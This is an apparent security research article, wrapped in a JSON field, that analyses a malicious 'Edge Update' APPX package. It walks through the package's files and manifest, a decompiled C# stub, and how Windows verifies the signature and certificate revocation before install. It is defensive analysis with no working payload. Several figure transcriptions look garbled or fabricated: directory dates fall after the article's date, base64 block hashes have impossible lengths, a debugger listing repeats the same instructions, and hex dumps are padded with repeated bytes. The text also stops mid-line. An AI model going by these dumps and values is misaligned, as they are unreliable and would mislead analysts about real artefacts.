    "markdown": "# Inside Malicious Windows Apps for Malware Deployment\n\n**Date:** July 14, 2022\n\nThis article discusses Windows Apps – Windows applications packaged into *APPX* or *MSIX* packages – as a medium to deploy malware. Though not as widely abused as other infection vectors, there have been a number of recent high profile attacks that use Windows Apps.\n\n- **November, 2021:** BazarBackdoor was distributed in the form of an *APPX* package.\n- **December, 2021:** Emotet malware was distributed by abusing a spoofing vulnerability in the Windows App Installer, software that installs Windows Apps.\n- **January, 2022:** Malicious Windows Apps in *APPX* format masquerading as critical browser updates were used to drop Magniber ransomware.\n- **February, 2022:** Windows Apps laced with the Electron Bot malware were uploaded to the Microsoft Store, a trusted library of Microsoft-certified packaged Windows Apps.\n\nSince Microsoft’s announcement that Office applications will by default disable the execution of Office macros in the context of documents that originate from untrusted sources, there has been an uptick in malicious actors using alternative mediums for deploying malware such as Windows Apps and Windows shortcut *LNK* files. Despite Microsoft recently rolling back the decision to disable by default Office macro execution, these media complement malicious macros and remain a threat to watch for.\n\nPrevious research on malicious Windows Apps focused on concrete system infections involving particular instances of such Apps. This article complements previous research by taking a generic perspective. I take an *APPX* package that malicious actors have used to deploy malware as a running example and provide:\n\n- A summarizing overview of the layout and content of *APPX* packages (*APPX* packages are structurally very similar to the alternative *MSIX* packages and the two Windows App packaging formats share the same deployment infrastructure).\n- An overview of selected activities that the Windows system conducts when a user installs a malicious *APPX* package.\n\nThis enables a better understanding of what occurs on a system when a user falls prey to an attack that involves a malicious Windows App – from the operating system activities at first user interaction with the file to the malware deployment that the file triggers.\n\nFor Windows to install an *APPX* package, whether malicious or not, the system first has to establish trust in the package. Microsoft provides the Microsoft Store to Windows users as a library of certified packaged Windows Apps. These packages are digitally counter-signed by Microsoft. Windows trusts by default *APPX* packages that originate from the Windows Store. However, when the Windows App sideloading feature is enabled, users can install *APPX* packages that do not originate from the Microsoft Store as well, that is, packages that are not counter-signed by Microsoft. Such are the majority of the malicious *APPX* packages that the security community has observed in attacks.\n\nIn this article, we will dig into how malicious *APPX* packages can be installed on a Windows 10 system, with a focus on how Windows establishes trust in an *APPX* package. I focus on this aspect since trust is a crucial part of the Windows App installation process. This process is what ultimately deploys malware on a system. I will use the malicious *APPX* package *edge_update.appx* (SHA1: *e491af786b5ee3c57920b79460da351ccf8f6f6b*) as a running example.\n\n## What Does a Malicious Windows App Look Like?\n\nThe `edge_update.appx` *APPX* package is signed with a code signing certificate issued to Foresee Consulting Inc. and a root certificate issued by DigiCert Trusted Root G4. Windows systems trust DigiCert root certificates and they are placed in the *Trusted Root Certification Authorities* certificate store.\n\nFigure 1 depicts the certificate chain of the digital signature of `edge_update.appx` before a Certificate Authority revoked the certificate.\n\n```image\nAlt: Figure 1: The certificate chain of the digital signature of *edge_update.appx* prior certificate revocation\nDescription: The image displays a certificate verification path for a digital signature. It shows the hierarchy of the certificate chain, starting from the root certificate 'DigiCert Trusted Root G4,' followed by a code signing certificate issued to 'Foresee Consulting Inc.' The path indicates that the digital signature is authenticated up to a trusted root authority, which is relevant for understanding the trustworthiness of the malicious Windows app discussed in the surrounding text.\nTranscription: |\n  Certificate\n  \n  General\n  Details\n  Certification Path\n  \n  Certification path\n  - DigiCert Trusted Root G4\n    - DigiCert Trusted G4 Code Signing RSA4096 SHA384 2021 CA1\n      - Foresee Consulting Inc.\n```\n\n*APPX* packages are ZIP archive files that store the executable files that implement the packaged Windows App and additional files. Figure 2 depicts the content of `edge_update.appx`. The `eediwjus` directory stores the malicious Windows App that the executable files `eediwjus.exe` and `eediwjus.dll` implement. `eediwjus.exe` is a .NET Windows App (see Figure 3) that invokes the `mhjpfzvitta` function from `eediwjus.dll`. This function executes malicious code that is heavily control-flow obfuscated with unconditional jumps (see Figure 4). The analysis of the malicious code is out of the scope of this article.\n\n```image\nAlt: Figure 2: The content of *edge_update.appx*\nDescription: The image displays a directory listing of files within a malicious APPX package, specifically located in the path `C:\\Users\\<user>\\malicious_appx\\`. It shows the file names, their sizes, and timestamps of last modifications. The top section lists general files associated with the APPX package, including `AppxBlockMap.xml`, `AppxManifest.xml`, and `AppxSignature.p7x`, along with the malicious directory `eediwjus`. The bottom section provides a detailed view of the `eediwjus` directory, listing two executable files: `eediwjus.dll` and `eediwjus.exe`, along with their respective sizes.\nTranscription: |\n  Directory of C:\\Users\\<USER>\\malicious_appx\\\n  05/07/2022  12:47    <DIR>          .\n  05/07/2022  12:47    <DIR>          ..\n  29/12/2022  13:55    <DIR>          AppxBlockMap.xml\n  29/12/2022  13:55    <DIR>          AppxManifest.xml\n  29/12/2022  13:55    <DIR>          AppxMetadata\n  30/12/2022  12:47    <DIR>          AppxSignature.p7x\n                 2.439 AppxBlockMap.xml\n                 2.039 AppxManifest.xml\n                 8.342 AppxSignature.p7x\n                 2.216 resources.pri\n                 740  [Content_Types].xml\n                 [...]\n  \n  Directory of C:\\Users\\<USER>\\malicious_appx\\eediwjus\\\n  05/07/2022  12:47    <DIR>          .\n  05/07/2022  12:47    <DIR>          ..\n  29/12/2022  13:55         5.632 eediwjus.dll\n  29/12/2021  13:55         3.584 eediwjus.exe\n```\n\n```image\nAlt: Figure 3: The implementation of *eediwjus.exe*\nDescription: The image depicts a code snippet in C# that showcases a class named `eediwjus`. The code includes details such as the class definition, an import statement for a DLL named `eediwjus.dll`, and a method `mhjpfzvitta` that is declared as an external function. The `Main` method initializes a variable `lpBuffer` and calls the external function with this variable as an argument. The snippet is formatted with color coding to indicate different elements of the code, such as keywords and comments.\nTranscription: |\n  namespace eediwjus\n  {\n      // Token: 0x02000002 RID: 2\n      public class eediwjus\n      {\n          // Token: 0x06000001 RID: 1\n          [DllImport(\"eediwjus.dll\")]\n          private static extern void mhjpfzvitta(uint lpBuffer);\n  \n          // Token: 0x06000002 RID: 2 RVA: 0x00000250 File Offset: 0x00000250\n          private static void Main(string[] args)\n          {\n              uint lpBuffer = 5604U;\n              eediwjus.mhjpfzvitta(lpBuffer);\n          }\n      }\n  }\n```\n\n```image\nAlt: Figure 4: Control-flow obfuscated malicious code in *eediwjus.dll*\nDescription: The image displays a snippet of disassembled code, likely from the malicious executable `eediwjus.exe`. It shows various assembly language instructions, including push and jump operations, along with references to memory locations. The code is annotated with comments indicating cross-references to the function `mhjpfzvitta`, which is identified as part of the malicious behavior associated with this executable.\nTranscription: |\n  .text:0000000018000113F loc_18000113F:          ; CODE XREF: mhjpfzvitta+p\n  .text:0000000018000113F     push    rbp\n  .text:00000000180001140 loc_180001140:          ; CODE XREF: .text:00000000180001196\n  .text:00000000180001140     jmp     short loc_180001196\n  .text:00000000180001142 loc_180001142:         \n  .text:00000000180001142     push    r14\n  .text:00000000180001144 loc_180001144:          ; CODE XREF: .text:000000001800011F2\n  .text:00000000180001144     jmp     loc_1800011F2\n  .text:00000000180001146     db      83h, 99h, 21h\n  .text:00000000180001149 loc_18000114C:         \n  .text:0000000018000114C     lea     rdx, [rbp-8]\n  .text:0000000018000114C     jmp     loc_1800011E4\n  .text:00000000180001150     db      0F6h, 92h, 33h\n  .text:00000000180001153     db      7ch, 7dh\n  .text:00000000180001155 loc_18000115A:         \n  .text:0000000018000115A     mov     rbp, rsp\n  .text:0000000018000115D     jmp     short loc_1800011C9\n```\n\nIn addition to the files that implement a Windows App, an *APPX* package stores additional files, such as `AppxManifest.xml`, `AppxBlockMap.xml`, and `AppxSignature.p7x`.\n\n`AppxManifest.xml` is the package manifest, a file in XML (Extensible Markup Language) format that contains the information that Windows needs to deploy, display, and update a Windows App. This includes information about:\n\n- The publisher of the App, where the publisher is the entity that digitally signs the *APPX* package and that is responsible for the development and release of the Windows App.\n- Windows App properties, such as display name and logo.\n- Software dependencies and capabilities: The Windows system controls what system resources a Windows App can access with respect to the capabilities that the publisher has assigned to the App. System resources include the Internet, filesystem locations, and networking. In summary, Windows Apps execute in a sandboxed, access-restricted, environment for security reasons.\n\nFigure 5 depicts the content of `AppxManifest.xml` in the malicious `edge_update.appx`. The publisher of the Windows App is *Foresee Consulting Inc.*, the display name of the App is *Edge Update*, and the App has the capabilities `internetClient` and `runFullTrust`. The `internetClient` capability enables the malicious Windows App to download data from the Internet, probably a payload from an attacker-controlled endpoint.\n\n```image\nAlt: Figure 5: The content of *AppxManifest.xml* in *edge_update.appx* (trimmed for brevity)\nDescription: The image displays the content of the `AppxManifest.xml` file from the malicious `edge_update.appx` package. It includes XML code detailing the identity of the application, which is signed by Foresee Consulting Inc. The display name of the app is 'Edge Update', and it outlines several properties such as publisher information, version details, and resource requirements. Additionally, it highlights the app's capabilities, specifically 'internetClient' and 'runFullTrust', indicating that the application can access the internet and has full trust permissions within the Windows environment.\nTranscription: |\n  <?xml version=\"1.0\" encoding=\"utf-8\"?>\n  <Package xmlns=\"http://schemas.microsoft.com/appx/manifest/foundation/windows10\">\n    <Identity Name=\"3669e262-ec02-4e9d-bcbd-3d088b4afac9\" Publisher=\"CN=Foresee Consulting Inc., L=North York, S=Ontario, C=CA, SERIALNUMBER=1040913-1, OID.1.3.6.1.4.1.311.60.2.1.3=CA, OID.2.5.4.15=Private Organization\" Version=\"96.0.1072.0\" ProcessorArchitecture=\"neutral\" />\n    <Properties>\n      <DisplayName>Edge Update</DisplayName>\n      <PublisherDisplayName>Microsoft Inc</PublisherDisplayName>\n      <Logo>Images\\StoreLogo.png</Logo>\n    </Properties>\n    <Dependencies>\n      <TargetDeviceFamily Name=\"Windows.Universal\" MinVersion=\"10.0.14393.0\" MaxVersionTested=\"10.0.19041.0\" />\n      <TargetDeviceFamily Name=\"Windows.Desktop\" MinVersion=\"10.0.14393.0\" MaxVersionTested=\"10.0.19041.0\" />\n    </Dependencies>\n    <Resources>\n      <Resource Language=\"EN-US\" />\n    </Resources>\n    <Applications>\n      <Application Id=\"App\" Executable=\"eediwjus.exe\" EntryPoint=\"Windows.FullTrustApplication\">\n        <uap:SplashScreen Image=\"Images\\SplashScreen.png\" />\n        <uap:LockScreen BadgeLogo=\"Images\\BadgeLogo.png\" Notification=\"badgeAndTileText\" />\n      </Application>\n    </Applications>\n    <Capabilities>\n      <Capability Name=\"internetClient\" />\n      <rescap:Capability Name=\"runFullTrust\" />\n    </Capabilities>\n  </Package>\n```\n\n`AppxBlockMap.xml` is the package block map, a file in XML format that stores Base-64 encoded hash values of data blocks in the files that an *APPX* package archives. Windows uses these hashes to verify the data integrity of these files when installing an *APPX* package, a topic that I discuss further in this article.\n\nFigure 6 depicts the content of `AppxBlockMap.xml` in the malicious `edge_update.appx`. The `HashMethod` XML attribute specifies the hash algorithm for calculating the data block hash values in `AppxBlockMap.xml`. The `File` XML element specifies a file in the *APPX* package and the size of the file. The `Block` XML element specifies the hash value and the size of a single data block in the file. For example, a data block in `eediwjus.exe` that is 1304 bytes big has the SHA-256 hash value of *ad4f74c0c3ac37e6f1cf600a96ae203c38341d263dbac0741e602686794c4f5a* (in hexadecimal format).\n\n```image\nAlt: Figure 6: The content of *AppxBlockMap.xml* in *edge_update.appx* (trimmed for brevity)\nDescription: The image displays an XML structure representing the content of an *AppxBlockMap.xml* file from a malicious APPX package named `edge_update.appx`. It includes elements such as `HashMethod`, which specifies the hash algorithm used, and multiple `File` elements detailing individual files within the package. Each `File` entry lists attributes such as `File Name`, `Size`, and a corresponding `Block Hash`, which provides the SHA-256 hash of specific data blocks in the file.\nTranscription: |\n  <?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n  <BlockMap xmlns=\"http://schemas.microsoft.com/appx/2010/blockmap\" HashMethod=\"http://www.w3.org/2001/04/xmlenc#sha256\">\n    <File Name=\"eediwjus\\eediwjus.exe\" Size=\"3584\" LfhSize=\"51\">\n      <Block Hash=\"ru90WOsNh+bz2AK2lq4gPDg8H5YusB0HmAmhnIM1Io=\" Size=\"1304\"/>\n    </File>\n    <File Name=\"eediwjus\\eediwjus.dll\" Size=\"5632\" LfhSize=\"51\">\n      <Block Hash=\"9C0gbarmyAq2IwgfMgfef+MUu1Up14eJ3YarNeRsY=\" Size=\"4280\"/>\n    </File>\n    <File Name=\"resources.pri\" Size=\"2216\" LfhSize=\"43\"/>\n    <File Name=\"AppxManifest.xml\" Size=\"2039\" LfhSize=\"46\">\n      <Block Hash=\"kMExXuwujmFwXpesPEI17NjZsArZfVULhB9=\" Size=\"902\"/>\n    </File>\n  </BlockMap>\n```\n\n`AppxSignature.p7x` is the *APPX* package signature, a PKCS (Public-Key Cryptography Standards) #7 digital signature data in ASN.1 (Abstract Syntax Notation One) format. `AppxSignature.p7x` stores signature data, such as the certificate chain of the digital signature and the actual signed data. The signed data includes hashes of files in the APPX package, such as `AppxManifest.xml` and `AppxBlockMap.xml`. Figure 7 depicts the formatted content of `AppxSignature.p7x` in the malicious `edge_update.appx`.\n\n```image\nAlt: Figure 7: The content of *AppxSignature.p7x* in *edge_update.appx* (trimmed for brevity)\nDescription: The image shows the structured content of a digital signature in ASN.1 format, specifically detailing the certificate chain related to the `edge_update.appx` APPX package. It includes sequences with object identifiers for various components such as the signature algorithm (SHA-256), the signing context for Microsoft code signing, and the common names of the involved entities: DigiCert Trusted Root G4 and Foresee Consulting Inc. This representation is crucial for understanding the security validations tied to the digital signature of malicious Windows applications.\nTranscription: |\n  SEQUENCE (2 elem)\n      OBJECT IDENTIFIER 1.2.840.113549.1.7.2 signedData (PKCS #7)\n      [0] (0 elem)\n  SEQUENCE (5 elem)\n      INTEGER 1\n      SET (1 elem)\n          SEQUENCE (2 elem)\n              OBJECT IDENTIFIER 2.16.840.1.101.3.4.2.1 sha-256 (NIST Algorithm)\n              NULL\n      SEQUENCE (2 elem)\n          OBJECT IDENTIFIER 1.3.6.1.4.1.311.2.1.4 spcIndirectDataContext (Microsoft code signing)\n          [0] (1 elem)\n              OBJECT IDENTIFIER 2.5.4.3 commonName (X.520 DN component)\n              PrintableString DigiCert Trusted Root G4\n          [...]\n          OBJECT IDENTIFIER 2.5.4.3 commonName (X.520 DN component)\n              PrintableString DigiCert Trusted G4 Code Signing RSA4096 SHA384 2021 CA1\n          [...]\n          OBJECT IDENTIFIER 2.5.4.3 commonName (X.520 DN component)\n              PrintableString Foresee Consulting Inc.\n```\n\n## Is a Malicious Windows App Trustworthy?\n\nThe `AppxSvc` service (`Appx Deployment Service`), which the DLL (dynamic-link library) `%SystemRoot%\\System32\\appxdeploymentserver.dll` implements, orchestrates the installation of *APPX* packages. When a user installs an *APPX* package, the `AppxSvc` service verifies the data integrity of the package and verifies that the package satisfies certain trust criteria. Figure 8 depicts a simplified overview of the data integrity verification process that the `AppxSvc` service conducts.\n\n```image\nAlt: Figure 8: A simplified overview of the data integrity verification process that the *AppxSvc* service conducts\nDescription: The image is a flowchart depicting the data integrity verification process conducted by the `AppxSvc` service when installing an *APPX* package. It outlines the steps involved in verifying the package signature (`AppxSignature.p7x`), the verification of `AppxBlockMap.xml`, and the subsequent verification of data blocks specified by `AppxBlockMap.xml`. The flowchart indicates decision points where the process can either continue or terminate based on whether each verification step is successful.\nTranscription: |\n  AppxSvc verifies the package signature AppxSignature.p7x\n      ├── Verified?\n      │   ├── No\n      │   │   └── AppxSvc terminates the package installation\n      │   └── Yes\n      │       └── AppxSvc verifies AppxBlockMap.xml\n      │           ├── Verified?\n      │           │   ├── No\n      │           │   │   └── AppxSvc terminates the package installation\n      │           │   └── Yes\n      │           │       └── AppxSvc verifies the data blocks that AppxBlockMap.xml specifies\n      │           │           ├── Verified?\n      │           │           │   ├── No\n      │           │           │   │   └── AppxSvc terminates the package installation\n      │           │           │   └── Yes\n      │           │           │       └── AppxSvc continues the package installation\n```\n\nIn summary, the data integrity verification process consists of the following steps:\n\n1. The `AppxSvc` service invokes the *WinVerifyTrust* function to verify the *APPX* package signature `AppxSignature.p7x`, that is, to verify the signed data in `AppxSignature.p7x` using the certificate chain in `AppxSignature.p7x` (see Figure 7). The signed data includes hashes of files that the *APPX* package stores, including `AppxBlockMap.xml` (see Figure 6). For example, Figure 9 depicts the hash value of `AppxBlockMap.xml` in the malicious `edge_update.appx` and the same value in `AppxSignature.p7x`, the package signature of `edge_update.appx`.\n\n   ```image\n   Alt: Figure 9: The hash value of *AppxBlockMap.xml* in the package signature of *edge_update.appx*\n   Description: The image is a screenshot of a command-line interface displaying the SHA-256 hash value of a file named 'AppxBlockMap.xml'. The command executed is 'Get-FileHash', which computes the hash of the specified file. The output shows the algorithm used (SHA256) and the corresponding hash value: '025C22C3EAD2720DA646FEA322EEBEC95B5B1CD1D0991850FFD28C7890F157C9'. This screenshot is relevant to the context of validating data integrity for malicious Windows apps, specifically in relation to the data integrity verification process involving the AppxSvc service.\n   Transcription: |\n     PS C:\\Users\\<user>\\Desktop\\malicious_appx\\malicious_appx> Get-FileHash .\\AppxBlockMap.xml\n     Algorithm Hash\n     --------- ----\n     SHA256  025C22C3EAD2720DA646FEA322EEBEC95B5B1CD1D0991850FFD28C7890F157C9\n   ```\n\n2. The successful verification of the signed data in `AppxSignature.p7x` enables the `AppxSvc` service to verify the data integrity of the files whose hashes are part of the signed data, including `AppxBlockMap.xml`. The `AppxSvc` service does this by first computing the SHA-256 hash value of `AppxBlockMap.xml` and then comparing the computed value with the SHA-256 hash value of `AppxBlockMap.xml` in the previously verified signed data.\n\n3. Once the `AppxSvc` service verifies the data integrity of `AppxBlockMap.xml`, the service verifies the integrity of the data blocks that `AppxBlockMap.xml` specifies (see Figure 6). The service does this by first computing the hash values of the data blocks and then comparing the computed values with the Base-64 encoded hash values in `AppxBlockMap.xml`.\n\nThe steps above ensure that the data in an *APPX* package is credible, with the overall process relying on a successful verification of the signed data in `AppxSignature.p7x`. However, for Windows to install an *APPX* package, also a malicious package, the system also has to verify that the package satisfies a set of trust criteria.\n\nPrevious research provides more background information on the steps above. This article focuses on the trust criteria that relate to the certificates in `AppxSignature.p7x` that the `AppxSvc` service uses to verify the signed data in `AppxSignature.p7x`.\n\nThese certificates represent the root of trust for the data integrity verification of an *APPX* package and for establishing trust in the package. In addition, in contrast to other *APPX* package-internal data structures for data integrity and trust verification, the certificates are more relevant entities from an operational perspective to end-users.\n\nWhen the `AppxSvc` service installs the malicious `edge_update.appx`, the service executes:\n\n- The *CertVerifyCertificateChainPolicy* function to validate the certificates in `AppxSignature.p7x` against the following certificate validation policies: *CERT_CHAIN_POLICY_AUTHENTICODE* (2), *CERT_CHAIN_POLICY_AUTHENTICODE_TS* (3), *CERT_CHAIN_POLICY_BASE* (1), and *CERT_CHAIN_POLICY_BASIC_CONSTRAINTS* (5). Among other certificate properties, `CertVerifyCertificateChainPolicy` validates whether the certificates are valid for code signing and whether the root certificate is trusted – present in a certificate store for trusted root certificates, such as *Trusted Root Certification Authorities*.\n- The *CertGetCertificateChain* function to check the revocation status of the certificates in `AppxSignature.p7x`.\n\nIf any validation by `CertVerifyCertificateChainPolicy` or `CertGetCertificateChain` fails, the `AppxSvc` service does not establish trust in the *APPX* package and terminates the installation of `edge_update.appx`.\n\nTo demonstrate a failed validation by `CertVerifyCertificateChainPolicy`, Figure 10 depicts a scenario that I crafted: The `AppxSvc` service executes `CertVerifyCertificateChainPolicy` to validate the certificates in the package signature of `edge_update.appx` against the *CERT_CHAIN_POLICY_AUTHENTICODE* (2) and *CERT_CHAIN_POLICY_BASE* (1) certificate validation policies. The *CERT_CHAIN_POLICY_BASE* policy fails the validation of the certificates due to an untrusted root certificate – the root certificate issued by DigiCert Trusted Root G4 is not present in a certificate store for trusted root certificates. This causes the `AppxSvc` service to terminate the installation of `edge_update.appx`.\n\n```image\nAlt: Figure 10: *CertVerifyCertificateChainPolicy* fails the validation of the certificates in the package signature of *edge_update.appx* due to an untrusted root certificate\nDescription: The image depicts a debugger output showing a breakpoint hit in the `CertVerifyCertificateChainPolicy` function from the Windows `CRYPT32` library. It displays the memory address and instruction being executed, along with the value of the register `rcx` at two different points. The values of `rcx` indicate the status or result of the operation, which is often used in debugging to trace the execution flow and validate the correctness of cryptographic operations related to certificate verification.\nTranscription: |\n  Breakpoint 0 hit\n  CRYPT32!CertVerifyCertificateChainPolicy:\n  00007ffb`34485560 4c8bdc        mov     r11,rsp\n  00007ffb`34485563 488bce        mov     rcx,rdx\n  00007ffb`34485566 488bda        mov     rbx,rdx\n  00007ffb`34485569 488bcb        mov     rcx,r11\n  00007ffb`3448556c 488bce        mov     rcx,rdx\n  00007ffb`3448556f 488bda        mov     rbx,rdx\n  00007ffb`34485572 488bcb        mov     rcx,r11\n  00007ffb`34485575 488bce        mov     rcx,rdx\n  00007ffb`34485578 488bda        mov     rbx,rdx\n  00007ffb`3448557b 488bcb        mov     rcx,r11\n  00007ffb`3448557e 488bce        mov     rcx,rdx\n  00007ffb`34485581 488bda        mov     rbx,rdx\n  00007ffb`34485584 488bcb        mov     rcx,r11\n  rcx=00000000000000002\n  00007ffb`34485587 488bce        mov     rcx,rdx\n  00007ffb`3448558a 488bda        mov     rbx,rdx\n  00007ffb`3448558d 488bcb        mov     rcx,r11\n  00007ffb`34485590 488bce        mov     rcx,rdx\n  00007ffb`34485593 488bda        mov     rbx,rdx\n  00007ffb`34485596 488bcb        mov     rcx,r11\n  00007ffb`34485599 488bce        mov     rcx,rdx\n  00007ffb`3448559c 488bda        mov     rbx,rdx\n  00007ffb`3448559f 488bcb        mov     rcx,r11\n  rcx=00000000000000001\n```\n\nIn practice, `CertVerifyCertificateChainPolicy` successfully validates the certificates in the package signature of the malicious `edge_update.appx`. This is because the root certificate, which is issued by DigiCert Trusted Root G4, is present in the *Trusted Root Certification Authorities* certificate store.\n\n## Revoked, or Not, That is the Question\n\nThe `AppxSvc` service executes the `CertGetCertificateChain` function to check the revocation status of the certificates in the package signature of `edge_update.appx`, starting from the end certificate in the certificate chain – the one issued to Foresee Consulting Inc. (see Figure 11).\n\n```image\nAlt: Figure 11: The certificate issued to Foresee Consulting Inc. in the context of the *CertGetCertificateChain* function (in ASN.1 format)\nDescription: The image presents a hexadecimal and ASCII dump of a file, likely related to a certificate or digital signature. The dump includes addresses, hexadecimal values, and their corresponding ASCII representations. It appears to contain details about a certificate associated with Foresee Consulting Inc., as indicated by the text within the ASCII section. This information is relevant to the analysis of the certificate chain and its potential revocation status in the context of malicious Windows applications.\nTranscription: |\n  0:083: db 00000246' cdbe9ad8 L0x7e8\n  00000246' cdbe9ad0 30 82 07 e4 82 01 0a 82 00 00 00 00 00 00 00 00\n  00000246' cdbe9ae0 c0 f1 8d a3 e2 e3 00 01 02 01 0e 10 0b 00 00\n  00000246' cdbe9af0 0d ed 09 2a 86 48 86 f7 0d 01 01 01 0b 00 00\n  00000246' cdbe9b00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  00000246' cdbe9b10 15 03 65 04 53 00 01 01 01 0a 01 01 01 0b 00\n  00000246' cdbe9b20 30 49 30 47 06 09 2a 86 48 86 f7 0d 01 01 01\n  00000246' cdbe9b30 0c 01 01 01 0b 00 00 00 00 00 00 00 00 00\n  00000246' cdbe9b40 20 47 47 2a 64 64 64 64 64 64 64 64 64 64 64\n  00000246' cdbe9b50 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9b60 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9b70 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9b80 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9b90 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9ba0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9bb0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9bc0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9bd0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9be0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9bf0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9c00 0a 13 17 46 67 72 73 65 73 66 65 67 66 67 67\n  00000246' cdbe9c10 72 69 67 69 67 69 67 69 67 69 67 69 67 69 67\n  00000246' cdbe9c20 72 69 67 69 67 69 67 69 67 69 67 69 67 69 67\n  00000246' cdbe9c30 72 69 67 69 67 69 67 69 67 69 67 69 67 69 67\n  00000246' cdbe9c40 04 81 ad 38 81 aa 53 a0 51 a0 48 46 86 4d 68\n  00000246' cdbe9f20 74 0a 3a 2f 2e 2e 2e 2e 2e 2e 2e 2e 2e 2e 2e\n  00000246' cdbe9f30 72 74 2e 66 2f 64 64 64 64 64 64 64 64 64 64\n  00000246' cdbe9f40 72 72 67 67 67 67 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f50 60 66 67 65 72 72 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f60 60 66 67 65 72 72 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f70 60 66 67 65 72 72 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f80 60 66 67 65 72 72 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f90 48 41 73 67 67 67 67 67 67 67 67 67 67 67 67\n```\n\n`AppxSvc` executes `CertGetCertificateChain` such that the function verifies the revocation status of all certificates in the certificate chain, including the root certificate – the `dwFlags` parameter of `CertGetCertificateChain` has the value of **0x20000000** (*CERT_CHAIN_REVOCATION_CHECK_CHAIN*, see Figure 12).\n\n```image\nAlt: Figure 12: *CertGetCertificateChain* verifies the revocation status of all certificates in the certificate chain\nDescription: The image shows a debugger output for the `CertGetCertificateChain` function from the CRYPT32 library. It highlights a breakpoint where the function's execution has paused, displaying several memory addresses and values. Notably, the value '20000000' is emphasized, which corresponds to the `dwFlags` parameter used in the certificate chain verification process. This output is relevant as it provides technical details about the function's operation in the context of checking certificate revocation.\nTranscription: |\n  Breakpoint 3 hit\n  CRYPT32!CertGetCertificateChain:\n  00007ffb`6e9b4ae0 488bc4          mov     rax,rsp\n  [...]\n  0:008> dps @rsp\n  000000ab`68ffef58  46f6c19b appxdeploymentserver![...]\n  000000ab`68ffef60  00000000\n  000000ab`68ffef68  46fdc60a appxdeploymentserver![...]\n  000000ab`68ffef70  00000000\n  000000ab`68ffef78  00000000\n  000000ab`68ffef80  68ffefa0\n  000000ab`68ffef88  000000246`20000000\n```\n\nPrior to the revocation of the end certificate issued to Foresee Consulting Inc., `CertGetCertificateChain` did not indicate an issue with the certificate chain in the package signature of `edge_update.appx`. This resulted in the `AppxSvc` service completing the installation of the malicious *APPX* package and therefore compromising the system. Windows places installed Windows Apps in the `%ProgramFiles%\\WindowsApps` directory (see Figure 13).\n\n```image\nAlt: Figure 13: The *AppxSvc* service has completed the installation of the malicious *edge_update.appx*\nDescription: The image displays a file directory from the Windows operating system, specifically located under the 'Program Files\\WindowsApps' path. It shows a folder named 'eediwjus' containing two files: 'eediwjus.dll' (an application extension) and 'eediwjus' (an application), both modified on 07/07/2022 at 18:52. The file sizes are 6 KB for 'eediwjus.dll' and 4 KB for the 'eediwjus' application.\nTranscription: |\n  File: eediwjus\n  Location: Program Files\\WindowsApps\\3669e262-ec02-4e9d-bcb4-3d008b4afac9_96.0.1072.0_neutral_vgngsjmjd8sje\n  \n  Name            Date modified       Type                     Size\n  eediwjus.dll    07/07/2022 18:52    Application extension    6 KB\n  eediwjus        07/07/2022 18:52    Application              4 KB\n```\n\nAfter the revocation of the end certificate, `CertGetCertificateChain` indicates that a certificate in the package signature of `edge_update.appx` has been revoked by storing the *CERT_TRUST_IS_REVOKED* (**0x00000004**) error code in a *CERT_TRUST_STATUS* structure (see Figure 14). This results in the `AppxSvc` service terminating the installation of the malicious *APPX* package with an error (see Figure 15).\n\n```image\nAlt: Figure 14: *CertGetCertificateChain* stores the *CERT_TRUST_IS_REVOKED* (*0x00000004*) error code in a *CERT_TRUST_STATUS* structure\nDescription: The image displays a hexadecimal dump of a data segment, showing memory addresses and corresponding byte values. Notably, the value '04' is highlighted in the dump, likely indicating the presence of the *CERT_TRUST_IS_REVOKED* error code (0x00000004) relevant to the context of certificate revocation in the *CertGetCertificateChain* function. This representation is typically used in technical analysis for debugging or examining memory related to software behavior.\nTranscription: |\n  0:008> db 00000246`cb949c60\n  00000246`cb949c60  48 00 00 00 04 00 00 00  00 00 00 00 01 00 00 00  H..............\n  00000246`cb949c70  e0 9c 94 cb 46 02 00 00  00 00 00 00 00 00 00 00  ....F..........\n```\n\n```image\nAlt: Figure 15: The *AppxSvc* service terminates the installation of the malicious *edge_update.appx* with an error\nDescription: The image shows an error log from a command line interface indicating a failed attempt to deploy a malicious Windows app package (`malicious_appx.appx`). It details the error message, including an HRESULT code (0x800B010C) indicating that a certificate was explicitly revoked by its issuer. The log provides a command suggestion to check the Event Log for further details and includes the line of code attempting the app deployment, along with additional context about the error.\nTranscription: |\n  add-appxpackage : Deployment failed with HRESULT: 0x800B010C, A certificate was explicitly revoked by its issuer.\n  Deployment Add operation with target volume C: on Package 36096262-ec02-4e9d-bcb4-3d0884afa96_0.0.1072.0_neutral__vgnsgjmdj8sje from: (malicious_appx.appx) failed with error 0x800B010C. See http://go.microsoft.com/fwlink/?LinkId=235160 for help diagnosing app deployment issues.\n  NOTE: For additional information, look for [ActivityId] b3f723a8-91de-0000-4277-f7b3de91d801 in the Event Log or use the command line Get-AppPackageLog -ActivityID b3f723a8-91de-0000-4277-f7b3de91d801\n  At line:1 char:1\n  + add-appxpackage C:\\Users\\<user>\\Desktop\\malicious_appx\\malicious_appx ...\n  + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n      + CategoryInfo          : NotSpecified: (C:\\Users\\<user>\\...icious_appx.appx:String) [Add-AppxPackage], Exception\n      + FullyQualifiedErrorId : 